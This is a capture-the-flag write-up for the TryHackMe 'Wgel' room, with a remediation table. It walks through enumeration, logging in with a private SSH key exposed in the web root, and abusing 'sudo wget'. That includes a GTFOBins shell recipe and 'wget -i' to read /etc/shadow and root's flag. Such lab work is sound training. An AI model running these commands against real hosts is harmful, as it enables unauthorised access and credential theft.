# TryHackMe — Wgel CTF

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu 16.04) |
| **Date** | 2026-11-26 |
| **Skills** | HTML source review, directory enumeration in depth, exposed SSH private key, `sudo wget` arbitrary file read |

> Flags and hashes are redacted, following TryHackMe's write-up guidelines.

## Summary

The default Apache page hides an HTML comment naming a user, **jessie**. Directory enumeration finds `/sitemap/`, and a second scan *inside* it finds an exposed **`.ssh/` folder with a private key**. That key logs in as jessie over SSH. jessie can run **`wget` as root without a password**; the shell recipe needs a newer wget, but wget's `-i` option reads any file and prints its lines in the error log, which leaks root's flag.

## 1. Reconnaissance

```bash
sudo nmap -p- --min-rate 1000 -T4 -oN ports.txt <TARGET>
sudo nmap -p 22,80 -sV -sC -oN services.txt <TARGET>
```

| Port | Service | Notes |
|---|---|---|
| 22 | OpenSSH 7.2p2 (Ubuntu) | |
| 80 | Apache 2.4.18 (Ubuntu) | Title: "Apache2 Ubuntu Default Page: It works" |

Unlike a page that names a CMS, a default page gives no concrete lead, so here a directory scan was justified from the start, along with reading the page.

## 2. Web

### The HTML source

On the rendered page I first picked up template text (the `apache2ctl` paragraph, a Launchpad link) as possible clues. Both are part of every Ubuntu default page. The interesting part is in the **source**, in the comments:

```bash
curl -s http://<TARGET> | grep -n '<!--'
```

```
4:  <!--
201:<!--      <div class="table_of_contents floating_element">
278: <!-- Jessie don't forget to udate the webiste -->
```

A likely system username: **jessie**.

**Dead end:** my first attempt used double quotes, `grep -n "<!--"`, and returned nothing. In zsh and bash, `!` inside double quotes triggers **history expansion**: the shell replaced it with a previous command before grep ever ran. Single quotes pass the pattern untouched.

### Enumeration in depth

Gobuster on the root found `/sitemap/`, a website template. I dismissed it as "generic" and assumed gobuster had already looked inside.

**Dead end:** gobuster is **not recursive**. It only tests one level under the URL you give it. Scanning `/sitemap/` itself:

```bash
gobuster dir -u http://<TARGET>/sitemap/ -w /usr/share/wordlists/dirb/common.txt
```

`common.txt` matters here: it includes dot-names (hidden files and folders on Linux), which the large directory lists often lack. Among the results: **`/sitemap/.ssh/`**, containing **`id_rsa`**, a private SSH key served to anyone.

(Recursive alternatives: `feroxbuster`, `dirb`. They save the manual step but make far more noise.)

## 3. Initial access — SSH with the key

```bash
wget http://<TARGET>/sitemap/.ssh/id_rsa
chmod 600 id_rsa
ssh -i id_rsa jessie@<TARGET>
```

Two things worth knowing here:

- `Permissions 0664 for '<key>' are too open ... This private key will be ignored`: SSH refuses private keys other users could read. `chmod 600` = read/write for the owner only.
- When the key can't be used (bad permissions, wrong path), SSH silently falls back to **asking for a password**, which looks like the key is wrong. The real reason is in the line above the prompt.

Downloading with `wget` is safer than copy-pasting: a missing line break or stray space corrupts the key.

The user flag is in `~/Documents/user_flag.txt`.

## 4. Privilege escalation — sudo wget

**Dead end:** I was going to skip `sudo -l` because I didn't know jessie's password. But `sudo -l` doesn't always ask for one, and `NOPASSWD` rules show up without it. It costs nothing to try.

```
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

- `(ALL : ALL) ALL`: anything as anyone, but **with jessie's password**, which I didn't have. The most powerful line, and useless here.
- `(root) NOPASSWD: /usr/bin/wget`: wget as root, no password. This is the one.

### The shell recipe fails

GTFOBins → wget → Sudo:

```bash
echo -e '#!/bin/sh\n/bin/sh 1>&0' > /tmp/x
chmod +x /tmp/x
sudo wget --use-askpass=/tmp/x 0
```

```
wget: unrecognized option '--use-askpass=/tmp/x'
```

`--use-askpass` was added in **wget 1.20**; this box has **1.17.1** (`wget --version`). GTFOBins doesn't list version requirements, so a recipe that fails is worth checking against the installed version.

### File read instead

wget's `-i` reads a file as a list of URLs to fetch. Give it a file that isn't a list of URLs and every line ends up in the **error log**, and running as root means any file can be read:

```bash
sudo wget -i /etc/shadow -o /tmp/shadow.log
cat /tmp/shadow.log
```

```
--2026-11-26 21:30:56--  ftp://root/!:18195:0:99999:7:::
...
--2026-11-26 21:30:56--  ftp://jessie/$6$<redacted>:18195:0:99999:7:::
```

A detour worth recording: root's password field is **`!`**, a locked account with no hash to crack (system accounts show `*`, same meaning). jessie's SHA-512 hash wouldn't help either: I was already jessie.

So, the file that ends the room directly. `/root/root.txt` doesn't exist, and I can't list `/root`. The user flag was `user_flag.txt`, so by analogy:

```bash
sudo wget -i /root/root_flag.txt -o /tmp/root.txt
cat /tmp/root.txt
```

```
--2026-11-26 21:38:39--  http://<redacted>/
Resolving <redacted> ... failed: Name or service not known.
```

The flag shows up as the "hostname" wget failed to resolve.

Cleanup on the target:

```bash
rm /tmp/x /tmp/shadow.log /tmp/root.txt
```

**Not done:** a full root shell. wget can also **write** any file as root (`-O`), for example overwriting `/etc/sudoers` with a version served from Kali. I stopped at the flag; that is the next step to turn file read into a real escalation.

## Attack chain

```
nmap → 22, 80 (default Apache page)
     → HTML comment → user "jessie"
     → gobuster / → /sitemap/ → gobuster /sitemap/ (common.txt) → .ssh/id_rsa
     → chmod 600 + ssh -i → jessie
     → sudo -l = (root) NOPASSWD: /usr/bin/wget
     → --use-askpass not in wget 1.17.1
     → sudo wget -i /root/root_flag.txt → flag in the error log
```

## Root causes and remediation

| Issue | Fix |
|---|---|
| Developer notes in HTML comments | Strip comments from production pages; never leave names or hints |
| `.ssh/` folder inside the web root | Never deploy home directories or dotfiles to the web root; deny dot-paths in the web server config |
| Private key without a passphrase | Protect keys with a passphrase; rotate any key that was exposed |
| `sudo wget` with NOPASSWD | wget reads and writes any file as root; never grant sudo on file-transfer tools; use a wrapper script with fixed arguments |
| Broad `(ALL : ALL) ALL` rule for a regular user | Least privilege: only the commands the user needs |

## Lessons learned

- **Read the source, not the rendered page**, and grep for `<!--`.
- **Single quotes for patterns with `!`**: double quotes trigger shell history expansion.
- **gobuster is one level deep.** Rescan every interesting directory, with a list that includes dot-names.
- **When SSH asks for a password after `-i`, the key wasn't used.** Read the line above: missing file or bad permissions (`chmod 600`).
- **Always run `sudo -l`**, even without the password: NOPASSWD rules show anyway.
- **GTFOBins recipes depend on the version.** Check `--version` when one fails, then try the binary's other tabs (file read / file write).
- **File read as root is not a root shell.** It got the flag; file write would have been the full escalation.
